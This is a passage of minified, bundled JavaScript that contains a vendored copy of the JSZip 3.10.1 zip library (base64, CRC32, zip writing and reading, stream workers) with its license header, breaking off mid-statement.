  `,document.head.appendChild(e)}function qr(){Ur()}var At=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof global<"u"?global:typeof self<"u"?self:{};function Wr(e){return e&&e.__esModule&&Object.prototype.hasOwnProperty.call(e,"default")?e.default:e}function Bt(e){throw new Error('Could not dynamically require "'+e+'". Please configure the dynamicRequireTargets or/and ignoreDynamicRequires option of @rollup/plugin-commonjs appropriately for this require call to work.')}var ti={exports:{}};/*!

JSZip v3.10.1 - A JavaScript class for generating and reading zip files
<http://stuartk.com/jszip>

(c) 2009-2016 Stuart Knightley <stuart [at] stuartk.com>
Dual licenced under the MIT license or GPLv3. See https://raw.github.com/Stuk/jszip/main/LICENSE.markdown.

JSZip uses the library pako released under the MIT license :
https://github.com/nodeca/pako/blob/main/LICENSE
*/var Fi;function Zr(){return Fi||(Fi=1,(function(e,i){(function(t){e.exports=t()})(function(){return(function t(s,r,o){function a(f,v){if(!r[f]){if(!s[f]){var c=typeof Bt=="function"&&Bt;if(!v&&c)return c(f,!0);if(n)return n(f,!0);var p=new Error("Cannot find module '"+f+"'");throw p.code="MODULE_NOT_FOUND",p}var h=r[f]={exports:{}};s[f][0].call(h.exports,function(m){var g=s[f][1][m];return a(g||m)},h,h.exports,t,s,r,o)}return r[f].exports}for(var n=typeof Bt=="function"&&Bt,d=0;d<o.length;d++)a(o[d]);return a})({1:[function(t,s,r){var o=t("./utils"),a=t("./support"),n="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";r.encode=function(d){for(var f,v,c,p,h,m,g,y=[],b=0,k=d.length,x=k,C=o.getTypeOf(d)!=="string";b<d.length;)x=k-b,c=C?(f=d[b++],v=b<k?d[b++]:0,b<k?d[b++]:0):(f=d.charCodeAt(b++),v=b<k?d.charCodeAt(b++):0,b<k?d.charCodeAt(b++):0),p=f>>2,h=(3&f)<<4|v>>4,m=1<x?(15&v)<<2|c>>6:64,g=2<x?63&c:64,y.push(n.charAt(p)+n.charAt(h)+n.charAt(m)+n.charAt(g));return y.join("")},r.decode=function(d){var f,v,c,p,h,m,g=0,y=0,b="data:";if(d.substr(0,b.length)===b)throw new Error("Invalid base64 input, it looks like a data url.");var k,x=3*(d=d.replace(/[^A-Za-z0-9+/=]/g,"")).length/4;if(d.charAt(d.length-1)===n.charAt(64)&&x--,d.charAt(d.length-2)===n.charAt(64)&&x--,x%1!=0)throw new Error("Invalid base64 input, bad content length.");for(k=a.uint8array?new Uint8Array(0|x):new Array(0|x);g<d.length;)f=n.indexOf(d.charAt(g++))<<2|(p=n.indexOf(d.charAt(g++)))>>4,v=(15&p)<<4|(h=n.indexOf(d.charAt(g++)))>>2,c=(3&h)<<6|(m=n.indexOf(d.charAt(g++))),k[y++]=f,h!==64&&(k[y++]=v),m!==64&&(k[y++]=c);return k}},{"./support":30,"./utils":32}],2:[function(t,s,r){var o=t("./external"),a=t("./stream/DataWorker"),n=t("./stream/Crc32Probe"),d=t("./stream/DataLengthProbe");function f(v,c,p,h,m){this.compressedSize=v,this.uncompressedSize=c,this.crc32=p,this.compression=h,this.compressedContent=m}f.prototype={getContentWorker:function(){var v=new a(o.Promise.resolve(this.compressedContent)).pipe(this.compression.uncompressWorker()).pipe(new d("data_length")),c=this;return v.on("end",function(){if(this.streamInfo.data_length!==c.uncompressedSize)throw new Error("Bug : uncompressed data size mismatch")}),v},getCompressedWorker:function(){return new a(o.Promise.resolve(this.compressedContent)).withStreamInfo("compressedSize",this.compressedSize).withStreamInfo("uncompressedSize",this.uncompressedSize).withStreamInfo("crc32",this.crc32).withStreamInfo("compression",this.compression)}},f.createWorkerFrom=function(v,c,p){return v.pipe(new n).pipe(new d("uncompressedSize")).pipe(c.compressWorker(p)).pipe(new d("compressedSize")).withStreamInfo("compression",c)},s.exports=f},{"./external":6,"./stream/Crc32Probe":25,"./stream/DataLengthProbe":26,"./stream/DataWorker":27}],3:[function(t,s,r){var o=t("./stream/GenericWorker");r.STORE={magic:"\0\0",compressWorker:function(){return new o("STORE compression")},uncompressWorker:function(){return new o("STORE decompression")}},r.DEFLATE=t("./flate")},{"./flate":7,"./stream/GenericWorker":28}],4:[function(t,s,r){var o=t("./utils"),a=(function(){for(var n,d=[],f=0;f<256;f++){n=f;for(var v=0;v<8;v++)n=1&n?3988292384^n>>>1:n>>>1;d[f]=n}return d})();s.exports=function(n,d){return n!==void 0&&n.length?o.getTypeOf(n)!=="string"?(function(f,v,c,p){var h=a,m=p+c;f^=-1;for(var g=p;g<m;g++)f=f>>>8^h[255&(f^v[g])];return-1^f})(0|d,n,n.length,0):(function(f,v,c,p){var h=a,m=p+c;f^=-1;for(var g=p;g<m;g++)f=f>>>8^h[255&(f^v.charCodeAt(g))];return-1^f})(0|d,n,n.length,0):0}},{"./utils":32}],5:[function(t,s,r){r.base64=!1,r.binary=!1,r.dir=!1,r.createFolders=!0,r.date=null,r.compression=null,r.compressionOptions=null,r.comment=null,r.unixPermissions=null,r.dosPermissions=null},{}],6:[function(t,s,r){var o=null;o=typeof Promise<"u"?Promise:t("lie"),s.exports={Promise:o}},{lie:37}],7:[function(t,s,r){var o=typeof Uint8Array<"u"&&typeof Uint16Array<"u"&&typeof Uint32Array<"u",a=t("pako"),n=t("./utils"),d=t("./stream/GenericWorker"),f=o?"uint8array":"array";function v(c,p){d.call(this,"FlateWorker/"+c),this._pako=null,this._pakoAction=c,this._pakoOptions=p,this.meta={}}r.magic="\b\0",n.inherits(v,d),v.prototype.processChunk=function(c){this.meta=c.meta,this._pako===null&&this._createPako(),this._pako.push(n.transformTo(f,c.data),!1)},v.prototype.flush=function(){d.prototype.flush.call(this),this._pako===null&&this._createPako(),this._pako.push([],!0)},v.prototype.cleanUp=function(){d.prototype.cleanUp.call(this),this._pako=null},v.prototype._createPako=function(){this._pako=new a[this._pakoAction]({raw:!0,level:this._pakoOptions.level||-1});var c=this;this._pako.onData=function(p){c.push({data:p,meta:c.meta})}},r.compressWorker=function(c){return new v("Deflate",c)},r.uncompressWorker=function(){return new v("Inflate",{})}},{"./stream/GenericWorker":28,"./utils":32,pako:38}],8:[function(t,s,r){function o(h,m){var g,y="";for(g=0;g<m;g++)y+=String.fromCharCode(255&h),h>>>=8;return y}function a(h,m,g,y,b,k){var x,C,z=h.file,P=h.compression,R=k!==f.utf8encode,j=n.transformTo("string",k(z.name)),M=n.transformTo("string",f.utf8encode(z.name)),D=z.comment,Y=n.transformTo("string",k(D)),E=n.transformTo("string",f.utf8encode(D)),H=M.length!==z.name.length,l=E.length!==D.length,A="",J="",N="",U=z.dir,q=z.date,te={crc32:0,compressedSize:0,uncompressedSize:0};m&&!g||(te.crc32=h.crc32,te.compressedSize=h.compressedSize,te.uncompressedSize=h.uncompressedSize);var B=0;m&&(B|=8),R||!H&&!l||(B|=2048);var I=0,ee=0;U&&(I|=16),b==="UNIX"?(ee=798,I|=(function(X,ge){var re=X;return X||(re=ge?16893:33204),(65535&re)<<16})(z.unixPermissions,U)):(ee=20,I|=(function(X){return 63&(X||0)})(z.dosPermissions)),x=q.getUTCHours(),x<<=6,x|=q.getUTCMinutes(),x<<=5,x|=q.getUTCSeconds()/2,C=q.getUTCFullYear()-1980,C<<=4,C|=q.getUTCMonth()+1,C<<=5,C|=q.getUTCDate(),H&&(J=o(1,1)+o(v(j),4)+M,A+="up"+o(J.length,2)+J),l&&(N=o(1,1)+o(v(Y),4)+E,A+="uc"+o(N.length,2)+N);var K="";return K+=`
\0`,K+=o(B,2),K+=P.magic,K+=o(x,2),K+=o(C,2),K+=o(te.crc32,4),K+=o(te.compressedSize,4),K+=o(te.uncompressedSize,4),K+=o(j.length,2),K+=o(A.length,2),{fileRecord:c.LOCAL_FILE_HEADER+K+j+A,dirRecord:c.CENTRAL_FILE_HEADER+o(ee,2)+K+o(Y.length,2)+"\0\0\0\0"+o(I,4)+o(y,4)+j+A+Y}}var n=t("../utils"),d=t("../stream/GenericWorker"),f=t("../utf8"),v=t("../crc32"),c=t("../signature");function p(h,m,g,y){d.call(this,"ZipFileWorker"),this.bytesWritten=0,this.zipComment=m,this.zipPlatform=g,this.encodeFileName=y,this.streamFiles=h,this.accumulate=!1,this.contentBuffer=[],this.dirRecords=[],this.currentSourceOffset=0,this.entriesCount=0,this.currentFile=null,this._sources=[]}n.inherits(p,d),p.prototype.push=function(h){var m=h.meta.percent||0,g=this.entriesCount,y=this._sources.length;this.accumulate?this.contentBuffer.push(h):(this.bytesWritten+=h.data.length,d.prototype.push.call(this,{data:h.data,meta:{currentFile:this.currentFile,percent:g?(m+100*(g-y-1))/g:100}}))},p.prototype.openedSource=function(h){this.currentSourceOffset=this.bytesWritten,this.currentFile=h.file.name;var m=this.streamFiles&&!h.file.dir;if(m){var g=a(h,m,!1,this.currentSourceOffset,this.zipPlatform,this.encodeFileName);this.push({data:g.fileRecord,meta:{percent:0}})}else this.accumulate=!0},p.prototype.closedSource=function(h){this.accumulate=!1;var m=this.streamFiles&&!h.file.dir,g=a(h,m,!0,this.currentSourceOffset,this.zipPlatform,this.encodeFileName);if(this.dirRecords.push(g.dirRecord),m)this.push({data:(function(y){return c.DATA_DESCRIPTOR+o(y.crc32,4)+o(y.compressedSize,4)+o(y.uncompressedSize,4)})(h),meta:{percent:100}});else for(this.push({data:g.fileRecord,meta:{percent:0}});this.contentBuffer.length;)this.push(this.contentBuffer.shift());this.currentFile=null},p.prototype.flush=function(){for(var h=this.bytesWritten,m=0;m<this.dirRecords.length;m++)this.push({data:this.dirRecords[m],meta:{percent:100}});var g=this.bytesWritten-h,y=(function(b,k,x,C,z){var P=n.transformTo("string",z(C));return c.CENTRAL_DIRECTORY_END+"\0\0\0\0"+o(b,2)+o(b,2)+o(k,4)+o(x,4)+o(P.length,2)+P})(this.dirRecords.length,g,h,this.zipComment,this.encodeFileName);this.push({data:y,meta:{percent:100}})},p.prototype.prepareNextSource=function(){this.previous=this._sources.shift(),this.openedSource(this.previous.streamInfo),this.isPaused?this.previous.pause():this.previous.resume()},p.prototype.registerPrevious=function(h){this._sources.push(h);var m=this;return h.on("data",function(g){m.processChunk(g)}),h.on("end",function(){m.closedSource(m.previous.streamInfo),m._sources.length?m.prepareNextSource():m.end()}),h.on("error",function(g){m.error(g)}),this},p.prototype.resume=function(){return!!d.prototype.resume.call(this)&&(!this.previous&&this._sources.length?(this.prepareNextSource(),!0):this.previous||this._sources.length||this.generatedError?void 0:(this.end(),!0))},p.prototype.error=function(h){var m=this._sources;if(!d.prototype.error.call(this,h))return!1;for(var g=0;g<m.length;g++)try{m[g].error(h)}catch{}return!0},p.prototype.lock=function(){d.prototype.lock.call(this);for(var h=this._sources,m=0;m<h.length;m++)h[m].lock()},s.exports=p},{"../crc32":4,"../signature":23,"../stream/GenericWorker":28,"../utf8":31,"../utils":32}],9:[function(t,s,r){var o=t("../compressions"),a=t("./ZipFileWorker");r.generateWorker=function(n,d,f){var v=new a(d.streamFiles,f,d.platform,d.encodeFileName),c=0;try{n.forEach(function(p,h){c++;var m=(function(k,x){var C=k||x,z=o[C];if(!z)throw new Error(C+" is not a valid compression method !");return z})(h.options.compression,d.compression),g=h.options.compressionOptions||d.compressionOptions||{},y=h.dir,b=h.date;h._compressWorker(m,g).withStreamInfo("file",{name:p,dir:y,date:b,comment:h.comment||"",unixPermissions:h.unixPermissions,dosPermissions:h.dosPermissions}).pipe(v)}),v.entriesCount=c}catch(p){v.error(p)}return v}},{"../compressions":3,"./ZipFileWorker":8}],10:[function(t,s,r){function o(){if(!(this instanceof o))return new o;if(arguments.length)throw new Error("The constructor with parameters has been removed in JSZip 3.0, please check the upgrade guide.");this.files=Object.create(null),this.comment=null,this.root="",this.clone=function(){var a=new o;for(var n in this)typeof this[n]!="function"&&(a[n]=this[n]);return a}}(o.prototype=t("./object")).loadAsync=t("./load"),o.support=t("./support"),o.defaults=t("./defaults"),o.version="3.10.1",o.loadAsync=function(a,n){return new o().loadAsync(a,n)},o.external=t("./external"),s.exports=o},{"./defaults":5,"./external":6,"./load":11,"./object":15,"./support":30}],11:[function(t,s,r){var o=t("./utils"),a=t("./external"),n=t("./utf8"),d=t("./zipEntries"),f=t("./stream/Crc32Probe"),v=t("./nodejsUtils");function c(p){return new a.Promise(function(h,m){var g=p.decompressed.getContentWorker().pipe(new f);g.on("error",function(y){m(y)}).on("end",function(){g.streamInfo.crc32!==p.decompressed.crc32?m(new Error("Corrupted zip : CRC32 mismatch")):h()}).resume()})}s.exports=function(p,h){var m=this;return h=o.extend(h||{},{base64:!1,checkCRC32:!1,optimizedBinaryString:!1,createFolders:!1,decodeFileName:n.utf8decode}),v.isNode&&v.isStream(p)?a.Promise.reject(new Error("JSZip can't accept a stream when loading a zip file.")):o.prepareContent("the loaded zip file",p,!0,h.optimizedBinaryString,h.base64).then(function(g){var y=new d(h);return y.load(g),y}).then(function(g){var y=[a.Promise.resolve(g)],b=g.files;if(h.checkCRC32)for(var k=0;k<b.length;k++)y.push(c(b[k]));return a.Promise.all(y)}).then(function(g){for(var y=g.shift(),b=y.files,k=0;k<b.length;k++){var x=b[k],C=x.fileNameStr,z=o.resolve(x.fileNameStr);m.file(z,x.decompressed,{binary:!0,optimizedBinaryString:!0,date:x.date,dir:x.dir,comment:x.fileCommentStr.length?x.fileCommentStr:null,unixPermissions:x.unixPermissions,dosPermissions:x.dosPermissions,createFolders:h.createFolders}),x.dir||(m.file(z).unsafeOriginalName=C)}return y.zipComment.length&&(m.comment=y.zipComment),m})}},{"./external":6,"./nodejsUtils":14,"./stream/Crc32Probe":25,"./utf8":31,"./utils":32,"./zipEntries":33}],12:[function(t,s,r){var o=t("../utils"),a=t("../stream/GenericWorker");function n(d,f){a.call(this,"Nodejs stream input adapter for "+d),this._upstreamEnded=!1,this._bindStream(f)}o.inherits(n,a),n.prototype._bindStream=function(d){var f=this;(this._stream=d).pause(),d.on("data",function(v){f.push({data:v,meta:{percent:0}})}).on("error",function(v){f.isPaused?this.generatedError=v:f.error(v)}).on("end",function(){f.isPaused?f._upstreamEnded=!0:f.end()})},n.prototype.pause=function(){return!!a.prototype.pause.call(this)&&(this._stream.pause(),!0)},n.prototype.resume=function(){return!!a.prototype.resume.call(this)&&(this._upstreamEnded?this.end():this._stream.resume(),!0)},s.exports=n},{"../stream/GenericWorker":28,"../utils":32}],13:[function(t,s,r){var o=t("readable-stream").Readable;function a(n,d,f){o.call(this,d),this._helper=n;var v=this;n.on("data",function(c,p){v.push(c)||v._helper.pause(),f&&f(p)}).on("error",function(c){v.emit("error",c)}).on("end",function(){v.push(null)})}t("../utils").inherits(a,o),a.prototype._read=function(){this._helper.resume()},s.exports=a},{"../utils":32,"readable-stream":16}],14:[function(t,s,r){s.exports={isNode:typeof Buffer<"u",newBufferFrom:function(o,a){if(Buffer.from&&Buffer.from!==Uint8Array.from)return Buffer.from(o,a);if(typeof o=="number")throw new Error('The "data" argument must not be a number');return new Buffer(o,a)},allocBuffer:function(o){if(Buffer.alloc)return Buffer.alloc(o);var a=new Buffer(o);return a.fill(0),a},isBuffer:function(o){return Buffer.isBuffer(o)},isStream:function(o){return o&&typeof o.on=="function"&&typeof o.pause=="function"&&typeof o.resume=="function"}}},{}],15:[function(t,s,r){function o(z,P,R){var j,M=n.getTypeOf(P),D=n.extend(R||{},v);D.date=D.date||new Date,D.compression!==null&&(D.compression=D.compression.toUpperCase()),typeof D.unixPermissions=="string"&&(D.unixPermissions=parseInt(D.unixPermissions,8)),D.unixPermissions&&16384&D.unixPermissions&&(D.dir=!0),D.dosPermissions&&16&D.dosPermissions&&(D.dir=!0),D.dir&&(z=b(z)),D.createFolders&&(j=y(z))&&k.call(this,j,!0);var Y=M==="string"&&D.binary===!1&&D.base64===!1;R&&R.binary!==void 0||(D.binary=!Y),(P instanceof c&&P.uncompressedSize===0||D.dir||!P||P.length===0)&&(D.base64=!1,D.binary=!0,P="",D.compression="STORE",M="string");var E=null;E=P instanceof c||P instanceof d?P:m.isNode&&m.isStream(P)?new g(z,P):n.prepareContent(z,P,D.binary,D.optimizedBinaryString,D.base64);var H=new p(z,E,D);this.files[z]=H}var a=t("./utf8"),n=t("./utils"),d=t("./stream/GenericWorker"),f=t("./stream/StreamHelper"),v=t("./defaults"),c=t("./compressedObject"),p=t("./zipObject"),h=t("./generate"),m=t("./nodejsUtils"),g=t("./nodejs/NodejsStreamInputAdapter"),y=function(z){z.slice(-1)==="/"&&(z=z.substring(0,z.length-1));var P=z.lastIndexOf("/");return 0<P?z.substring(0,P):""},b=function(z){return z.slice(-1)!=="/"&&(z+="/"),z},k=function(z,P){return P=P!==void 0?P:v.createFolders,z=b(z),this.files[z]||o.call(this,z,null,{dir:!0,createFolders:P}),this.files[z]};function x(z){return Object.prototype.toString.call(z)==="[object RegExp]"}var C={load:function(){throw new Error("This method has been removed in JSZip 3.0, please check the upgrade guide.")},forEach:function(z){var P,R,j;for(P in this.files)j=this.files[P],(R=P.slice(this.root.length,P.length))&&P.slice(0,this.root.length)===this.root&&z(R,j)},filter:function(z){var P=[];return this.forEach(function(R,j){z(R,j)&&P.push(j)}),P},file:function(z,P,R){if(arguments.length!==1)return z=this.root+z,o.call(this,z,P,R),this;if(x(z)){var j=z;return this.filter(function(D,Y){return!Y.dir&&j.test(D)})}var M=this.files[this.root+z];return M&&!M.dir?M:null},folder:function(z){if(!z)return this;if(x(z))return this.filter(function(M,D){return D.dir&&z.test(M)});var P=this.root+z,R=k.call(this,P),j=this.clone();return j.root=R.name,j},remove:function(z){z=this.root+z;var P=this.files[z];if(P||(z.slice(-1)!=="/"&&(z+="/"),P=this.files[z]),P&&!P.dir)delete this.files[z];else for(var R=this.filter(function(M,D){return D.name.slice(0,z.length)===z}),j=0;j<R.length;j++)delete this.files[R[j].name];return this},generate:function(){throw new Error("This method has been removed in JSZip 3.0, please check the upgrade guide.")},generateInternalStream:function(z){var P,R={};try{if((R=n.extend(z||{},{streamFiles:!1,compression:"STORE",compressionOptions:null,type:"",platform:"DOS",comment:null,mimeType:"application/zip",encodeFileName:a.utf8encode})).type=R.type.toLowerCase(),R.compression=R.compression.toUpperCase(),R.type==="binarystring"&&(R.type="string"),!R.type)throw new Error("No output type specified.");n.checkSupport(R.type),R.platform!=="darwin"&&R.platform!=="freebsd"&&R.platform!=="linux"&&R.platform!=="sunos"||(R.platform="UNIX"),R.platform==="win32"&&(R.platform="DOS");var j=R.comment||this.comment||"";P=h.generateWorker(this,R,j)}catch(M){(P=new d("error")).error(M)}return new f(P,R.type||"string",R.mimeType)},generateAsync:function(z,P){return this.generateInternalStream(z).accumulate(P)},generateNodeStream:function(z,P){return(z=z||{}).type||(z.type="nodebuffer"),this.generateInternalStream(z).toNodejsStream(P)}};s.exports=C},{"./compressedObject":2,"./defaults":5,"./generate":9,"./nodejs/NodejsStreamInputAdapter":12,"./nodejsUtils":14,"./stream/GenericWorker":28,"./stream/StreamHelper":29,"./utf8":31,"./utils":32,"./zipObject":35}],16:[function(t,s,r){s.exports=t("stream")},{stream:void 0}],17:[function(t,s,r){var o=t("./DataReader");function a(n){o.call(this,n);for(var d=0;d<this.data.length;d++)n[d]=255&n[d]}t("../utils").inherits(a,o),a.prototype.byteAt=function(n){return this.data[this.zero+n]},a.prototype.lastIndexOfSignature=function(n){for(var d=n.charCodeAt(0),f=n.charCodeAt(1),v=n.charCodeAt(2),c=n.charCodeAt(3),p=this.length-4;0<=p;--p)if(this.data[p]===d&&this.data[p+1]===f&&this.data[p+2]===v&&this.data[p+3]===c)return p-this.zero;return-1},a.prototype.readAndCheckSignature=function(n){var d=n.charCodeAt(0),f=n.charCodeAt(1),v=n.charCodeAt(2),c=n.charCodeAt(3),p=this.readData(4);return d===p[0]&&f===p[1]&&v===p[2]&&c===p[3]},a.prototype.readData=function(n){if(this.checkOffset(n),n===0)return[];var d=this.data.slice(this.zero+this.index,this.zero+this.index+n);return this.index+=n,d},s.exports=a},{"../utils":32,"./DataReader":18}],18:[function(t,s,r){var o=t("../utils");function a(n){this.data=n,this.length=n.length,this.index=0,this.zero=0}a.prototype={checkOffset:function(n){this.checkIndex(this.index+n)},checkIndex:function(n){if(this.length<this.zero+n||n<0)throw new Error("End of data reached (data length = "+this.length+", asked index = "+n+"). Corrupted zip ?")},setIndex:function(n){this.checkIndex(n),this.index=n},skip:function(n){this.setIndex(this.index+n)},byteAt:function(){},readInt:function(n){var d,f=0;for(this.checkOffset(n),d=this.index+n-1;d>=this.index;d--)f=(f<<8)+this.byteAt(d);return this.index+=n,f},readString:function(n){return o.transformTo("string",this.readData(n))},readData:function(){},lastIndexOfSignature:function(){},readAndCheckSignature:function(){},readDate:function(){var n=this.readInt(4);return new Date(Date.UTC(1980+(n>>25&127),(n>>21&15)-1,n>>16&31,n>>11&31,n>>5&63,(31&n)<<1))}},s.exports=a},{"../utils":32}],19:[function(t,s,r){var o=t("./Uint8ArrayReader");function a(n){o.call(this,n)}t("../utils").inherits(a,o),a.prototype.readData=function(n){this.checkOffset(n);var d=this.data.slice(this.zero+this.index,this.zero+this.index+n);return this.index+=n,d},s.exports=a},{"../utils":32,"./Uint8ArrayReader":21}],20:[function(t,s,r){var o=t("./DataReader");function a(n){o.call(this,n)}t("../utils").inherits(a,o),a.prototype.byteAt=function(n){return this.data.charCodeAt(this.zero+n)},a.prototype.lastIndexOfSignature=function(n){return this.data.lastIndexOf(n)-this.zero},a.prototype.readAndCheckSignature=function(n){return n===this.readData(4)},a.prototype.readData=function(n){this.checkOffset(n);var d=this.data.slice(this.zero+this.index,this.zero+this.index+n);return this.index+=n,d},s.exports=a},{"../utils":32,"./DataReader":18}],21:[function(t,s,r){var o=t("./ArrayReader");function a(n){o.call(this,n)}t("../utils").inherits(a,o),a.prototype.readData=function(n){if(this.checkOffset(n),n===0)return new Uint8Array(0);var d=this.data.subarray(this.zero+this.index,this.zero+this.index+n);return this.index+=n,d},s.exports=a},{"../utils":32,"./ArrayReader":17}],22:[function(t,s,r){var o=t("../utils"),a=t("../support"),n=t("./ArrayReader"),d=t("./StringReader"),f=t("./NodeBufferReader"),v=t("./Uint8ArrayReader");s.exports=function(c){var p=o.getTypeOf(c);return o.checkSupport(p),p!=="string"||a.uint8array?p==="nodebuffer"?new f(c):a.uint8array?new v(o.transformTo("uint8array",c)):new n(o.transformTo("array",c)):new d(c)}},{"../support":30,"../utils":32,"./ArrayReader":17,"./NodeBufferReader":19,"./StringReader":20,"./Uint8ArrayReader":21}],23:[function(t,s,r){r.LOCAL_FILE_HEADER="PK",r.CENTRAL_FILE_HEADER="PK",r.CENTRAL_DIRECTORY_END="PK",r.ZIP64_CENTRAL_DIRECTORY_LOCATOR="PK\x07",r.ZIP64_CENTRAL_DIRECTORY_END="PK",r.DATA_DESCRIPTOR="PK\x07\b"},{}],24:[function(t,s,r){var o=t("./GenericWorker"),a=t("../utils");function n(d){o.call(this,"ConvertWorker to "+d),this.destType=d}a.inherits(n,o),n.prototype.processChunk=function(d){this.push({data:a.transformTo(this.destType,d.data),meta:d.meta})},s.exports=n},{"../utils":32,"./GenericWorker":28}],25:[function(t,s,r){var o=t("./GenericWorker"),a=t("../crc32");function n(){o.call(this,"Crc32Probe"),this.withStreamInfo("crc32",0)}t("../utils").inherits(n,o),n.prototype.processChunk=function(d){this.streamInfo.crc32=a(d.data,this.streamInfo.crc32||0),this.push(d)},s.exports=n},{"../crc32":4,"../utils":32,"./GenericWorker":28}],26:[function(t,s,r){var o=t("../utils"),a=t("./GenericWorker");function n(d){a.call(this,"DataLengthProbe for "+d),this.propName=d,this.withStreamInfo(d,0)}o.inherits(n,a),n.prototype.processChunk=function(d){if(d){var f=this.streamInfo[this.propName]||0;this.streamInfo[this.propName]=f+d.data.length}a.prototype.processChunk.call(this,d)},s.exports=n},{"../utils":32,"./GenericWorker":28}],27:[function(t,s,r){var o=t("../utils"),a=t("./GenericWorker");function n(d){a.call(this,"DataWorker");var f=this;this.dataIsReady=!1,this.index=0,this.max=0,this.data=null,this.type="",this._tickScheduled=!1,d.then(function(v){f.dataIsReady=!0,f.data=v,f.max=v&&v.length||0,f.type=o.getTypeOf(v),f.isPaused||f._tickAndRepeat()},function(v){f.error(v)})}o.inherits(n,a),n.prototype.cleanUp=function(){a.prototype.cleanUp.call(this),this.data=null},n.prototype.resume=function(){return!!a.prototype.resume.call(this)&&(!this._tickScheduled&&this.dataIsReady&&(this._tickScheduled=!0,o.delay(this._tickAndRepeat,[],this)),!0)},n.prototype._tickAndRepeat=function(){this._tickScheduled=!1,this.isPaused||this.isFinished||(this._tick(),this.isFinished||(o.delay(this._tickAndRepeat,[],this),this._tickScheduled=!0))},n.prototype._tick=function(){if(this.isPaused||this.isFinished)return!1;var d=null,f=Math.min(this.max,this.index+16384);if(this.index>=this.max)return this.end();switch(this.type){case"string":d=this.data.substring(this.index,f);break;case"uint8array":d=this.data.subarray(this.index,f);break;case"array":case"nodebuffer":d=this.data.slice(this.index,f)}return this.index=f,this.push({data:d,meta:{percent:this.max?this.index/this.max*100:0}})},s.exports=n},{"../utils":32,"./GenericWorker":28}],28:[function(t,s,r){function o(a){this.name=a||"default",this.streamInfo={},this.generatedError=null,this.extraStreamInfo={},this.isPaused=!0,this.isFinished=!1,this.isLocked=!1,this._listeners={data:[],end:[],error:[]},this.previous=null}o.prototype={push:function(a){this.emit("data",a)},end:function(){if(this.isFinished)return!1;this.flush();try{this.emit("end"),this.cleanUp(),this.isFinished=!0}catch(a){this.emit("error",a)}return!0},error:function(a){return!this.isFinished&&(this.isPaused?this.generatedError=a:(this.isFinished=!0,this.emit("error",a),this.previous&&this.previous.error(a),this.cleanUp()),!0)},on:function(a,n){return this._listeners[a].push(n),this},cleanUp:function(){this.streamInfo=this.generatedError=this.extraStreamInfo=null,this._listeners=[]},emit:function(a,n){if(this._listeners[a])for(var d=0;d<this._listeners[a].length;d++)this._listeners[a][d].call(this,n)},pipe:function(a){return a.registerPrevious(this)},registerPrevious:function(a){if(this.isLocked)throw new Error("The stream '"+this+"' has already been used.");this.streamInfo=a.streamInfo,this.mergeStreamInfo(),this.previous=a;var n=this;return a.on("data",function(d){n.processChunk(d)}),a.on("end",function(){n.end()}),a.on("error",function(d){n.error(d)}),this},pause:function(){return!this.isPaused&&!this.isFinished&&(this.isPaused=!0,this.previous&&this.previous.pause(),!0)},resume:function(){if(!this.isPaused||this.isFinished)return!1;var a=this.isPaused=!1;return this.generatedError&&(this.error(this.generatedError),a=!0),this.previous&&this.previous.resume(),!a},flush:function(){},processChunk:function(a){this.push(a)},withStreamInfo:function(a,n){return this.extraStreamInfo[a]=n,this.mergeStreamInfo(),this},mergeStreamInfo:function(){for(var a in this.extraStreamInfo)Object.prototype.hasOwnProperty.call(this.extraStreamInfo,a)&&(this.streamInfo[a]=this.extraStreamInfo[a])},lock:function(){if(this.isLocked)throw new Error("The stream '"+this+"' has already been used.");this.isLocked=!0,this.previous&&this.previous.lock()},toString:function(){var a="Worker "+this.name;return this.previous?this.previous+" -> "+a:a}},s.exports=o},{}],29:[function(t,s,r){var o=t("../utils"),a=t("./ConvertWorker"),n=t("./GenericWorker"),d=t("../base64"),f=t("../support"),v=t("../external"),c=null;if(f.nodestream)try{c=t("../nodejs/NodejsStreamOutputAdapter")}catch{}function p(m,g){return new v.Promise(function(y,b){var k=[],x=m._internalType,C=m._outputType,z=m._mimeType;m.on("data",function(P,R){k.push(P),g&&g(R)}).on("error",function(P){k=[],b(P)}).on("end",function(){try{var P=(function(R,j,M){switch(R){case"blob":return o.newBlob(o.transformTo("arraybuffer",j),M);case"base64":return d.encode(j);default:return o.transformTo(R,j)}})(C,(function(R,j){var M,D=0,Y=null,E=0;for(M=0;M<j.length;M++)E+=j[M].length;switch(R){case"string":return j.join("");case"array":return Array.prototype.concat.apply([],j);case"uint8array":for(Y=new Uint8Array(E),M=0;M<j.length;M++)Y.set(j[M],D),D+=j[M].length;return Y;case"nodebuffer":return Buffer.concat(j);default:throw new Error("concat : unsupported type '"+R+"'")}})(x,k),z);y(P)}catch(R){b(R)}k=[]}).resume()})}function h(m,g,y){var b=g;switch(g){case"blob":case"arraybuffer":b="uint8array";break;case"base64":b="string"}try{this._internalType=b,this._outputType=g,this._mimeType=y,o.checkSupport(b),this._worker=m.pipe(new a(b)),m.lock()}catch(k){this._worker=new n("error"),this._worker.error(k)}}h.prototype={accumulate:function(m){return p(this,m)},on:function(m,g){var y=this;return m==="data"?this._worker.on(m,function(b){g.call(y,b.data,b.meta)}):this._worker.on(m,function(){o.delay(g,arguments,y)}),this},resume:function(){return o.delay(this._worker.resume,[],this._worker),this},pause:function(){return this._worker.pause(),this},toNodejsStream:function(m){if(o.checkSupport("nodestream"),this._outputType!=="nodebuffer")throw new Error(this._outputType+" is not supported by this method");return new c(this,{objectMode:this._outputType!=="nodebuffer"},m)}},s.exports=h},{"../base64":1,"../external":6,"../nodejs/NodejsStreamOutputAdapter":13,"../support":30,"../utils":32,"./ConvertWorker":24,"./GenericWorker":28}],30:[function(t,s,r){if(r.base64=!0,r.array=!0,r.string=!0,r.arraybuffer=typeof ArrayBuffer<"u"&&typeof Uint8Array<"u",r.nodebuffer=typeof Buffer<"u",r.uint8array=typeof Uint8Array<"u",typeof ArrayBuffer>"u")r.blob=!1;else{var o=new ArrayBuffer(0);try{r.blob=new Blob([o],{type:"application/zip"}).size===0}catch{try{var a=new(self.BlobBuilder||self.WebKitBlobBuilder||self.MozBlobBuilder||self.MSBlobBuilder);a.append(o),r.blob=a.getBlob("application/zip").size===0}catch{r.blob=!1}}}try{r.nodestream=!!t("readable-stream").Readable}catch{r.nodestream=!1}},{"readable-stream":16}],31:[function(t,s,r){for(var o=t("./utils"),a=t("./support"),n=t("./nodejsUtils"),d=t("./stream/GenericWorker"),f=new 